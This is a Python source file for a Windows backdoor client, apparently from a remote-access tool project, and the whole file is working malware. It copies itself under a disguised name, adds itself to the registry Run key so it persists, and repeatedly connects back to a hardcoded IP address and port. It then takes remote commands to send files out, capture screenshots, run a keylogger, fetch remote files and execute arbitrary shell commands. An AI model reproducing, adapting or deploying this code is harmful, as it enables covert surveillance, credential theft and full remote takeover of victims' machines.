#!/usr/bin/env python
from base64 import b64encode
from json import dumps, loads
from os import chdir, environ, path, remove, listdir
from os.path import sep
from shutil import copyfile
from socket import socket, AF_INET, SOCK_STREAM
from subprocess import Popen, PIPE, call
from sys import executable
from threading import Thread
from time import sleep

from mss import mss
from requests import get

from src.color import Color
from src.keylogger import KeyLogger


class ReverseShell(KeyLogger):
    """Initiate backdoor and socket variable"""

    def __init__(self):
        super().__init__()
        self.location = f'{environ["appdata"]}\\windows32.exe'
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.ip = '192.168.11.100'
        self.port = 54321

    def backdoor(self):
        if not path.exists(self.location):
            copyfile(executable, self.location)
            call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\'
                 f'Run /v Backdoor /t REG_SZ /d {self.location}', shell=True)

    def connect(self):
        while True:
            sleep(20)
            try:
                self.sock.connect((self.ip, self.port))
                self.shell()
            except ConnectionRefusedError:
                self.connect()

    def help(self):
        help_options = (
            "\n"
            "help            --> print this help message\n"
            "download <path> --> download file from target\n"
            "upload <path>   --> upload file from target\n"
            "get <url>       --> download file from website to target\n"
            "screenshot      --> take screenshot on target\n"
            "check           --> check for admin privileges\n"
            "keylog <opt>    --> <start> --> start keylogger on target\n"
            "                    <dump>  --> retrieve logs from target\n"
            "quit            --> exit reverse shell\n"
        )
        self.safe_send(Color(help_options).yellow())

    def is_admin(self):
        try:
            try:
                system_root = environ.get('SystemRoot', 'C:\\Windows')
                _ = listdir(sep.join([system_root, 'temp']))
            except PermissionError:
                admin = Color("\n[!] Running as User\n").red()
            else:
                admin = Color("\n[+] Running as Admin\n").bold_green()

            self.safe_send(admin)
        except ValueError:
            self.safe_send(Color('\n[!] Cannot Perform Check\n').bold_red())

    def screenshot(self):
        try:
            with mss() as screenshot:
                screenshot.shot()
            with open("monitor-1.png", "rb") as capture:
                capture = b64encode(capture.read())
                self.safe_send(capture.decode('utf-8'))
            remove("monitor-1.png")
        except ValueError:
            prompt = "\n[!] Failed to Take Screenshot\n"
            self.safe_send(Color(prompt).bold_red())

    def download(self, command):
        with open(command[9:], 'rb') as file:
            result = b64encode(file.read())
            self.safe_send(result.decode('utf-8'))

    def get_request(self, command):
        try:
            url = command[4:]
            get_response = get(url)
            file_name = url.split('/')[-1]
            with open(file_name, 'wb') as out_file:
                out_file.write(get_response.content)
            prompt = f'\n[+] Downloaded "{file_name} to Target\n'
            self.safe_send(Color(prompt).green())
        except ValueError:
            prompt = "\n[!] Failed to Downloaded File\n"
            self.safe_send(Color(prompt).red())

    def start(self, command):
        try:
            Popen(command[6:], shell=True)
            self.safe_send(Color(f"\n[+] Started {command[6:]}\n").green())
        except ValueError:
            prompt = f"\n[!] Failed to Start {command[6:]}\n"
            self.safe_send(Color(prompt).bold_red())

    def return_proc(self, command):
        proc = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
        result = proc.stdout.read() + proc.stderr.read()
        self.safe_send(result.decode('utf-8'))

    def keylogger(self, command):
        if command[10:] == 'start':
            t1 = Thread(target=self.listen)
            t1.start()
        elif command[10:] == 'dump':
            with open(self.log_path) as log_file:
                self.safe_send(log_file.read())

    def safe_send(self, data: str):
        json_data = dumps(data)
        self.sock.send(json_data.encode('utf-8'))

    def safe_recv(self):
        data = ""
        while True:
            try:
                data = data + self.sock.recv(1024).decode()
                return loads(data)
            except ValueError:
                continue

    def shell(self):
        while True:
            command = self.safe_recv()
            if command == 'quit':
                break
            elif command[:2] == 'cd':
                try:
                    chdir(command[3:])
                except FileNotFoundError:
                    continue
            elif command == 'help':
                self.help()
            elif command[:8] == "download":
                self.download(command)
            elif command[:3] == "get":
                self.get_request(command)
            elif command[:10] == "screenshot":
                self.screenshot()
            elif command[:5] == "start":
                self.start(command)
            elif command[:5] == "check":
                self.is_admin()
            elif command[:9] == "keylogger":
                self.keylogger(command)
            else:
                self.return_proc(command)


def main():
    rev_shell = ReverseShell()
    rev_shell.backdoor()
    rev_shell.connect()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit(0)
